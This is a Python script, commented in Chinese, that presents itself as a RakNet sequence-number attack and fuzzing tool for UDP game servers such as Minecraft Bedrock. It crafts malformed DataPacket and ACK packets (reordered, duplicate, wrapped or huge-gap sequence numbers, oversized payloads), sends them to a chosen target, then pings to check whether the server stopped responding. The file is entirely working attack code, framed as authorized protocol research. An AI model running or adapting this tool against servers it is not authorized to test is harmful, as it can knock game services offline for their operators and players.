#!/usr/bin/env python3
"""
RakNet Sequence Number Attack / Fuzzing Test Script (单包版)

用途:
  对 RakNet 协议(常见于 Minecraft Bedrock / UDP 游戏服务端)进行 sequence number
  鲁棒性测试,每个场景仅发送 1 个包,用于快速探测服务端处理行为。

测试场景:
  1. reorder    乱序 sequence number
  2. duplicate  重复 sequence number
  3. gap        巨大 sequence number gap
  4. wrap       sequence number 回绕
  5. ack        ACK 灌注
  6. invalid    异常 / 非法 DataPacket

注意:
  - 仅用于授权的渗透测试与协议研究。
  - RakNet sequence number 为 24-bit (0 ~ 0xFFFFFF),使用 little-endian。
"""

import argparse
import random
import socket
import sys
import time
from typing import List


# ---------------------------------------------------------------------------
# RakNet 常量
# ---------------------------------------------------------------------------
ID_UNCONNECTED_PING = 0x01
ID_UNCONNECTED_PONG = 0x1C

ID_DATA_PACKET = 0x80       # 0x80 ~ 0x8d: DataPacket (带 sequence number)
ID_ACK = 0xC0               # 0xc0 ~ 0xc3: ACK

MAGIC = b"\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"

# RakNet sequence number 是 24-bit
SEQ_MAX = 0xFFFFFF
SEQ_MOD = 0x1000000


# ---------------------------------------------------------------------------
# 工具函数
# ---------------------------------------------------------------------------
def pack_seq24(seq: int) -> bytes:
    """将 24-bit sequence number 打包为 little-endian 3 字节。"""
    seq &= SEQ_MAX
    return bytes([seq & 0xFF, (seq >> 8) & 0xFF, (seq >> 16) & 0xFF])


def build_data_packet(seq: int, payload: bytes = b"\x00") -> bytes:
    """构造 DataPacket: ID_DATA_PACKET + 24-bit seq + payload。"""
    return bytes([ID_DATA_PACKET]) + pack_seq24(seq) + payload


def build_ack(seq_list: List[int]) -> bytes:
    """构造 ACK 包,每条 record 为 single (3 字节 seq)。"""
    count = min(len(seq_list), 3)
    flags = 0xC0 | (count & 0x03)
    body = bytearray([flags])
    for s in seq_list[:count]:
        body.append(0x00)          # record: single
        body += pack_seq24(s)
    return bytes(body)


# ---------------------------------------------------------------------------
# 攻击场景 (每个场景只发 1 个包)
# ---------------------------------------------------------------------------
SCENARIOS = {
    "reorder":   ("乱序 sequence number",       lambda: build_data_packet(random.randint(0, SEQ_MAX))),
    "duplicate": ("重复 sequence number (seq=0)", lambda: build_data_packet(0)),
    "gap":       ("巨大 sequence number gap",   lambda: build_data_packet(0xFFFFF0)),
    "wrap":      ("sequence number 回绕",       lambda: build_data_packet(0xFFFFFE)),
    "ack":       ("ACK 灌注",                   lambda: build_ack([random.randint(0, SEQ_MAX) for _ in range(3)])),
    "invalid":   ("异常 DataPacket (超长 payload)", lambda: build_data_packet(random.randint(0, SEQ_MAX), b"\x00" * 1024)),
}


# ---------------------------------------------------------------------------
# RakNet 客户端
# ---------------------------------------------------------------------------
class RakNetAttacker:
    def __init__(self, target: str, port: int, timeout: float = 2.0):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.settimeout(timeout)
        self.addr = (target, port)

    def send_raw(self, data: bytes) -> None:
        self.sock.sendto(data, self.addr)

    def recv_raw(self) -> bytes:
        try:
            data, _ = self.sock.recvfrom(2048)
            return data
        except socket.timeout:
            return b""

    def is_online(self) -> bool:
        """发送 Unconnected Ping 探测服务端是否在线。"""
        ts = (int(time.time() * 1000)).to_bytes(8, "big")
        pkt = bytes([ID_UNCONNECTED_PING]) + ts + MAGIC + b"\x00" * 8
        self.send_raw(pkt)
        resp = self.recv_raw()
        return bool(resp) and resp[0] == ID_UNCONNECTED_PONG

    def run(self, scenarios: List[str]) -> None:
        if self.is_online():
            print(f"[+] 目标在线: {self.addr[0]}:{self.addr[1]}")
        else:
            print(f"[!] 目标 {self.addr[0]}:{self.addr[1]} 未响应 Unconnected Ping,继续尝试...")

        for s in scenarios:
            desc, builder = SCENARIOS.get(s, (None, None))
            if builder is None:
                print(f"[!] 未知场景: {s}, 跳过")
                continue
            pkt = builder()
            try:
                self.send_raw(pkt)
                print(f"[*] {s:10s} 已发送 1 个包 ({desc}) -> {len(pkt)} bytes")
            except Exception as e:
                print(f"    [-] 场景 {s} 异常: {e}")

        # 收尾:观察服务端是否仍在响应
        time.sleep(0.5)
        alive = self.is_online()
        print(f"\n[*] 测试完成,服务端当前 {'在线' if alive else '无响应 / 离线'}")

    def close(self) -> None:
        self.sock.close()


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="RakNet sequence number 攻击 / 鲁棒性测试脚本 (单包版)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="可用场景:\n" + "\n".join(f"  {k:10s} {v[0]}" for k, v in SCENARIOS.items()),
    )
    p.add_argument("target", help="目标 IP / 主机名")
    p.add_argument("port", type=int, help="目标 UDP 端口")
    p.add_argument("-s", "--scenarios", nargs="+",
                   default=list(SCENARIOS.keys()),
                   choices=list(SCENARIOS.keys()),
                   help="要执行的攻击场景 (默认全部)")
    p.add_argument("-t", "--timeout", type=float, default=2.0,
                   help="socket 接收超时秒数 (默认 2.0)")
    return p.parse_args()


def main() -> int:
    args = parse_args()

    print("=" * 60)
    print(" RakNet Sequence Number Attack / Fuzzing Tool (单包版)")
    print("=" * 60)
    print(f" 目标   : {args.target}:{args.port}")
    print(f" 场景   : {', '.join(args.scenarios)}")
    print("=" * 60)
    print(" ⚠ 仅用于授权的安全测试与协议研究,禁止用于非法用途。\n")

    attacker = RakNetAttacker(args.target, args.port, args.timeout)
    try:
        attacker.run(args.scenarios)
    except KeyboardInterrupt:
        print("\n[!] 用户中断")
    finally:
        attacker.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
